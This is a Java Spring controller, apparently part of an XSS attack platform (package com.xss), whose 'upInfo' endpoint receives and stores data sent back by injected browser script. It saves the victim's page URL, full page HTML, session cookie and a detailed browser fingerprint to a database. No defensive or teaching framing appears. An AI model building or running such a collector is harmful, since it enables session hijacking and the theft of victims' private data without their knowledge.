package com.xss.controller;

import com.alibaba.fastjson.JSONObject;
import com.xss.bean.Info;
import com.xss.dao.InfoDao;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.annotation.Resource;
import java.net.URLDecoder;

@Controller
public class upInfo {

    @Resource
    InfoDao infoDao;

    @ResponseBody
    @RequestMapping("upInfo")
    public String upInfo(@RequestBody String body){
        JSONObject req = JSONObject.parseObject(body);
        JSONObject url = req.getJSONObject("url");
        JSONObject allInfo = req.getJSONObject("allInfo");
        Info info = new Info();
        info.setHref(url.getString("href"));
        info.setOrigin(url.getString("origin"));
        info.setProtocol(url.getString("protocol"));
        info.setHost(url.getString("host"));
        info.setHostname(url.getString("hostname"));
        info.setPort(url.getString("port"));
        info.setPathname(url.getString("pathname"));
        info.setHtml(req.getString("html"));
        info.setCookie(req.getString("cookie"));
        info.setBrowserType(allInfo.getString("browserType"));
        info.setProperty(allInfo.getString("property"));
        info.setAppName(allInfo.getString("appName"));
        info.setAppVersion(allInfo.getString("appVersion"));
        info.setCookieEnabled(allInfo.getString("cookieEnabled"));
        info.setSysType(allInfo.getString("sysType"));
        info.setPlugins(allInfo.getString("plugins"));
        info.setPluginsLength(allInfo.getString("pluginsLength"));
        info.setPluginsName(allInfo.getString("pluginsName"));
        info.setFlashEnabled(allInfo.getString("flashEnabled"));
        info.setWindowWidth(allInfo.getString("windowWidth"));
        info.setColorDepth(allInfo.getString("colorDepth"));
        infoDao.save(info);
        return "ok";
    }
}
